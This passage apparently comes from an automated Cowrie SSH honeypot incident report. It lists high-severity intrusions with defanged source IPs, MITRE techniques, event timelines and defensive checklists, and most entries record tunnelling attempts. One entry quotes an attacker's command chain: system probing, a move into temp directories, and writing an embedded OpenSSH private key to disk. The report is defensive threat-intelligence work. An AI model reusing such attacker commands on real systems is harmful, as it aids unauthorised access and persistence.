| `2026-08-23 05:02:32` | `cowrie.session.connect` |
| `2026-08-23 05:02:32` | `cowrie.client.version` |
| `2026-08-23 05:02:33` | `cowrie.client.kex` |
| `2026-08-23 05:02:33` | `cowrie.login.success` |
| `2026-08-23 05:02:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.234[.]194` to AbuseIPDB if not already reported
- [ ] Block `68.183.234[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e6cef08869b

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-23 05:02 |
| **Last Seen** | 2026-08-23 05:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca, ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:02:34` | `cowrie.session.connect` |
| `2026-08-23 05:02:34` | `cowrie.client.version` |
| `2026-08-23 05:02:34` | `cowrie.client.kex` |
| `2026-08-23 05:02:34` | `cowrie.login.success` |
| `2026-08-23 05:02:36` | `cowrie.session.params` |
| `2026-08-23 05:02:36` | `cowrie.command.input` |
| `2026-08-23 05:02:36` | `cowrie.session.file_download` |
| `2026-08-23 05:02:36` | `cowrie.session.file_download` |
| `2026-08-23 05:02:36` | `cowrie.log.closed` |
| `2026-08-23 05:02:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68037c6413ba

| Field | Detail |
|---|---|
| **Source IP** | `111.171.125[.]94` |
| **First Seen** | 2026-08-23 05:06 |
| **Last Seen** | 2026-08-23 05:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:06:47` | `cowrie.session.connect` |
| `2026-08-23 05:06:48` | `cowrie.client.version` |
| `2026-08-23 05:06:48` | `cowrie.client.kex` |
| `2026-08-23 05:06:50` | `cowrie.login.success` |
| `2026-08-23 05:06:51` | `cowrie.direct-tcpip.request` |
| `2026-08-23 05:06:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.171.125[.]94` to AbuseIPDB if not already reported
- [ ] Block `111.171.125[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6aa7876e10e9

| Field | Detail |
|---|---|
| **Source IP** | `177.174.0[.]3` |
| **First Seen** | 2026-08-23 05:06 |
| **Last Seen** | 2026-08-23 05:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:06:56` | `cowrie.session.connect` |
| `2026-08-23 05:06:57` | `cowrie.client.version` |
| `2026-08-23 05:06:57` | `cowrie.client.kex` |
| `2026-08-23 05:06:58` | `cowrie.login.success` |
| `2026-08-23 05:06:59` | `cowrie.direct-tcpip.request` |
| `2026-08-23 05:07:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.0[.]3` to AbuseIPDB if not already reported
- [ ] Block `177.174.0[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b04662ffcd1a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 05:10 |
| **Last Seen** | 2026-08-23 05:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:10:13` | `cowrie.session.connect` |
| `2026-08-23 05:10:13` | `cowrie.client.version` |
| `2026-08-23 05:10:13` | `cowrie.client.kex` |
| `2026-08-23 05:10:14` | `cowrie.login.success` |
| `2026-08-23 05:10:14` | `cowrie.direct-tcpip.request` |
| `2026-08-23 05:10:14` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 05:10:14` | `cowrie.direct-tcpip.data` |
| `2026-08-23 05:10:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-646e01d31224

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 05:10 |
| **Last Seen** | 2026-08-23 05:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:10:17` | `cowrie.session.connect` |
| `2026-08-23 05:10:17` | `cowrie.client.version` |
| `2026-08-23 05:10:17` | `cowrie.client.kex` |
| `2026-08-23 05:10:18` | `cowrie.login.success` |
| `2026-08-23 05:10:18` | `cowrie.direct-tcpip.request` |
| `2026-08-23 05:10:18` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 05:10:18` | `cowrie.direct-tcpip.data` |
| `2026-08-23 05:10:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24980fdc6bf7

| Field | Detail |
|---|---|
| **Source IP** | `69.194.3[.]6` |
| **First Seen** | 2026-08-23 05:11 |
| **Last Seen** | 2026-08-23 05:12 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:11:54` | `cowrie.session.connect` |
| `2026-08-23 05:11:55` | `cowrie.client.version` |
| `2026-08-23 05:11:55` | `cowrie.client.kex` |
| `2026-08-23 05:12:00` | `cowrie.login.success` |
| `2026-08-23 05:12:02` | `cowrie.direct-tcpip.request` |
| `2026-08-23 05:12:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.194.3[.]6` to AbuseIPDB if not already reported
- [ ] Block `69.194.3[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68f077426e9a

| Field | Detail |
|---|---|
| **Source IP** | `220.80.223[.]144` |
| **First Seen** | 2026-08-23 05:12 |
| **Last Seen** | 2026-08-23 05:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:12:07` | `cowrie.session.connect` |
| `2026-08-23 05:12:08` | `cowrie.client.version` |
| `2026-08-23 05:12:08` | `cowrie.client.kex` |
| `2026-08-23 05:12:10` | `cowrie.login.success` |
| `2026-08-23 05:12:11` | `cowrie.direct-tcpip.request` |
| `2026-08-23 05:12:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.80.223[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.80.223[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67813435db17

| Field | Detail |
|---|---|
| **Source IP** | `36.92.35[.]211` |
| **First Seen** | 2026-08-23 05:12 |
| **Last Seen** | 2026-08-23 05:12 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:12:10` | `cowrie.session.connect` |
| `2026-08-23 05:12:12` | `cowrie.client.version` |
| `2026-08-23 05:12:12` | `cowrie.client.kex` |
| `2026-08-23 05:12:14` | `cowrie.login.success` |
| `2026-08-23 05:12:15` | `cowrie.direct-tcpip.request` |
| `2026-08-23 05:12:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.35[.]211` to AbuseIPDB if not already reported
- [ ] Block `36.92.35[.]211` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b6f85a9db37

| Field | Detail |
|---|---|
| **Source IP** | `212.174.62[.]233` |
| **First Seen** | 2026-08-23 05:12 |
| **Last Seen** | 2026-08-23 05:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:12:20` | `cowrie.session.connect` |
| `2026-08-23 05:12:21` | `cowrie.client.version` |
| `2026-08-23 05:12:21` | `cowrie.client.kex` |
| `2026-08-23 05:12:22` | `cowrie.login.success` |
| `2026-08-23 05:12:22` | `cowrie.direct-tcpip.request` |
| `2026-08-23 05:12:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.174.62[.]233` to AbuseIPDB if not already reported
- [ ] Block `212.174.62[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3045b5353310

| Field | Detail |
|---|---|
| **Source IP** | `36.73.187[.]173` |
| **First Seen** | 2026-08-23 05:15 |
| **Last Seen** | 2026-08-23 05:15 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:15:17` | `cowrie.session.connect` |
| `2026-08-23 05:15:19` | `cowrie.client.version` |
| `2026-08-23 05:15:19` | `cowrie.client.kex` |
| `2026-08-23 05:15:22` | `cowrie.login.success` |
| `2026-08-23 05:15:24` | `cowrie.direct-tcpip.request` |
| `2026-08-23 05:15:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.73.187[.]173` to AbuseIPDB if not already reported
- [ ] Block `36.73.187[.]173` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea8c11a3dd9f

| Field | Detail |
|---|---|
| **Source IP** | `103.224.19[.]186` |
| **First Seen** | 2026-08-23 05:15 |
| **Last Seen** | 2026-08-23 05:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:15:32` | `cowrie.session.connect` |
| `2026-08-23 05:15:33` | `cowrie.client.version` |
| `2026-08-23 05:15:33` | `cowrie.client.kex` |
| `2026-08-23 05:15:35` | `cowrie.login.success` |
| `2026-08-23 05:15:36` | `cowrie.direct-tcpip.request` |
| `2026-08-23 05:15:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.224.19[.]186` to AbuseIPDB if not already reported
- [ ] Block `103.224.19[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a0fbd5c6ae8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 05:19 |
| **Last Seen** | 2026-08-23 05:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:19:37` | `cowrie.session.connect` |
| `2026-08-23 05:19:37` | `cowrie.client.version` |
| `2026-08-23 05:19:38` | `cowrie.client.kex` |
| `2026-08-23 05:19:38` | `cowrie.login.success` |
| `2026-08-23 05:19:39` | `cowrie.direct-tcpip.request` |
| `2026-08-23 05:19:39` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 05:19:39` | `cowrie.direct-tcpip.data` |
| `2026-08-23 05:19:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8967a081d7a2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 05:19 |
| **Last Seen** | 2026-08-23 05:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:19:41` | `cowrie.session.connect` |
| `2026-08-23 05:19:41` | `cowrie.client.version` |
| `2026-08-23 05:19:41` | `cowrie.client.kex` |
| `2026-08-23 05:19:42` | `cowrie.login.success` |
| `2026-08-23 05:19:42` | `cowrie.direct-tcpip.request` |
| `2026-08-23 05:19:43` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 05:19:43` | `cowrie.direct-tcpip.data` |
| `2026-08-23 05:19:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-505f38de1aa0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 05:29 |
| **Last Seen** | 2026-08-23 05:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:29:13` | `cowrie.session.connect` |
| `2026-08-23 05:29:13` | `cowrie.client.version` |
| `2026-08-23 05:29:14` | `cowrie.client.kex` |
| `2026-08-23 05:29:15` | `cowrie.login.success` |
| `2026-08-23 05:29:15` | `cowrie.direct-tcpip.request` |
| `2026-08-23 05:29:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 05:29:15` | `cowrie.direct-tcpip.data` |
| `2026-08-23 05:29:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-278339fea708

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 05:29 |
| **Last Seen** | 2026-08-23 05:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:29:17` | `cowrie.session.connect` |
| `2026-08-23 05:29:17` | `cowrie.client.version` |
| `2026-08-23 05:29:18` | `cowrie.client.kex` |
| `2026-08-23 05:29:18` | `cowrie.login.success` |
| `2026-08-23 05:29:19` | `cowrie.direct-tcpip.request` |
| `2026-08-23 05:29:19` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 05:29:19` | `cowrie.direct-tcpip.data` |
| `2026-08-23 05:29:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-765900aaf311

| Field | Detail |
|---|---|
| **Source IP** | `124.160.255[.]180` |
| **First Seen** | 2026-08-23 05:30 |
| **Last Seen** | 2026-08-23 05:30 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:30:45` | `cowrie.session.connect` |
| `2026-08-23 05:30:46` | `cowrie.client.version` |
| `2026-08-23 05:30:46` | `cowrie.client.kex` |
| `2026-08-23 05:30:51` | `cowrie.login.success` |
| `2026-08-23 05:30:53` | `cowrie.direct-tcpip.request` |
| `2026-08-23 05:30:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.160.255[.]180` to AbuseIPDB if not already reported
- [ ] Block `124.160.255[.]180` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5af78ff83727

| Field | Detail |
|---|---|
| **Source IP** | `176.170.1[.]244` |
| **First Seen** | 2026-08-23 05:31 |
| **Last Seen** | 2026-08-23 05:31 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:31:00` | `cowrie.session.connect` |
| `2026-08-23 05:31:03` | `cowrie.client.version` |
| `2026-08-23 05:31:03` | `cowrie.client.kex` |
| `2026-08-23 05:31:11` | `cowrie.login.success` |
| `2026-08-23 05:31:15` | `cowrie.direct-tcpip.request` |
| `2026-08-23 05:31:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.170.1[.]244` to AbuseIPDB if not already reported
- [ ] Block `176.170.1[.]244` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ed3b381365c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 05:38 |
| **Last Seen** | 2026-08-23 05:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:38:33` | `cowrie.session.connect` |
| `2026-08-23 05:38:33` | `cowrie.client.version` |
| `2026-08-23 05:38:33` | `cowrie.client.kex` |
| `2026-08-23 05:38:34` | `cowrie.login.success` |
| `2026-08-23 05:38:34` | `cowrie.direct-tcpip.request` |
| `2026-08-23 05:38:35` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 05:38:35` | `cowrie.direct-tcpip.data` |
| `2026-08-23 05:38:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-755ea09c3dff

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 05:38 |
| **Last Seen** | 2026-08-23 05:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:38:37` | `cowrie.session.connect` |
| `2026-08-23 05:38:37` | `cowrie.client.version` |
| `2026-08-23 05:38:37` | `cowrie.client.kex` |
| `2026-08-23 05:38:38` | `cowrie.login.success` |
| `2026-08-23 05:38:39` | `cowrie.direct-tcpip.request` |
| `2026-08-23 05:38:39` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 05:38:39` | `cowrie.direct-tcpip.data` |
| `2026-08-23 05:38:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-980e68f5968e

| Field | Detail |
|---|---|
| **Source IP** | `47.247.73[.]99` |
| **First Seen** | 2026-08-23 05:39 |
| **Last Seen** | 2026-08-23 05:39 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:39:28` | `cowrie.session.connect` |
| `2026-08-23 05:39:28` | `cowrie.client.version` |
| `2026-08-23 05:39:28` | `cowrie.client.kex` |
| `2026-08-23 05:39:31` | `cowrie.login.success` |
| `2026-08-23 05:39:32` | `cowrie.direct-tcpip.request` |
| `2026-08-23 05:39:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.247.73[.]99` to AbuseIPDB if not already reported
- [ ] Block `47.247.73[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc8cc29fd6db

| Field | Detail |
|---|---|
| **Source IP** | `211.169.212[.]206` |
| **First Seen** | 2026-08-23 05:39 |
| **Last Seen** | 2026-08-23 05:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:39:37` | `cowrie.session.connect` |
| `2026-08-23 05:39:38` | `cowrie.client.version` |
| `2026-08-23 05:39:38` | `cowrie.client.kex` |
| `2026-08-23 05:39:40` | `cowrie.login.success` |
| `2026-08-23 05:39:41` | `cowrie.direct-tcpip.request` |
| `2026-08-23 05:39:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.169.212[.]206` to AbuseIPDB if not already reported
- [ ] Block `211.169.212[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1302c2c74be

| Field | Detail |
|---|---|
| **Source IP** | `136.56.34[.]147` |
| **First Seen** | 2026-08-23 05:44 |
| **Last Seen** | 2026-08-23 05:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:44:27` | `cowrie.session.connect` |
| `2026-08-23 05:44:28` | `cowrie.client.version` |
| `2026-08-23 05:44:28` | `cowrie.client.kex` |
| `2026-08-23 05:44:29` | `cowrie.login.success` |
| `2026-08-23 05:44:29` | `cowrie.direct-tcpip.request` |
| `2026-08-23 05:44:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `136.56.34[.]147` to AbuseIPDB if not already reported
- [ ] Block `136.56.34[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c23e52003a56

| Field | Detail |
|---|---|
| **Source IP** | `211.58.176[.]42` |
| **First Seen** | 2026-08-23 05:44 |
| **Last Seen** | 2026-08-23 05:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:44:34` | `cowrie.session.connect` |
| `2026-08-23 05:44:35` | `cowrie.client.version` |
| `2026-08-23 05:44:35` | `cowrie.client.kex` |
| `2026-08-23 05:44:37` | `cowrie.login.success` |
| `2026-08-23 05:44:38` | `cowrie.direct-tcpip.request` |
| `2026-08-23 05:44:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.58.176[.]42` to AbuseIPDB if not already reported
- [ ] Block `211.58.176[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
